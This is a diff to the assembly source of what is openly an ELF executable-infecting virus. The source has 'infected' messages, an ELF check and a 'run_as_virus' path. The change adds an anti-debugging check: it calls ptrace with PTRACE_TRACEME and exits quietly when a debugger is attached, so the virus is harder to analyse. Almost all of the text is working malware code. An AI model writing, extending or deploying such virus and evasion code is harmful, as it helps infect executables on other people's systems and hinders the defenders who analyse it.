@@ -27,6 +27,7 @@ section .data
     msg_add_pt_load:      db "add pt_load", 10, 0
     msg_infected:         db "infected ", 0
     msg_already_infected: db "already infected", 10, 0
+    msg_debugging:        db "DEBUGGING..", 10, 0
     proc_self_exe:        db "/proc/self/exe", 0
 
 section .text
@@ -57,6 +58,22 @@ _start:
     push r13
     push r14
     push r15
+
+    ; ============================================
+    ; ANTI-DEBUGGING CHECK
+    ; Use ptrace(PTRACE_TRACEME) to detect debugger
+    ; Returns -1 (EPERM) if already being traced
+    ; ============================================
+    mov eax, SYS_PTRACE
+    mov edi, PTRACE_TRACEME
+    xor esi, esi
+    xor edx, edx
+    xor r10d, r10d
+    syscall
+    
+    ; If ptrace returns -1, we're being debugged
+    cmp rax, -1
+    je .being_debugged
 
     ; Get base address using RIP-relative call trick
     call .get_base
@@ -94,6 +111,19 @@ _start:
     call check_elf64_exec
     
     jmp _end
+
+.being_debugged:
+    ; Print "DEBUGGING.." message
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel msg_debugging]
+    mov edx, 13                 ; length of "DEBUGGING..\n\0"
+    syscall
+    
+    ; Exit the program
+    mov eax, 60                 ; SYS_EXIT
+    xor edi, edi                ; exit code 0
+    syscall
 
 .run_as_virus:
     ; ===== VIRUS EXECUTION PATH IN INFECTED BINARY =====
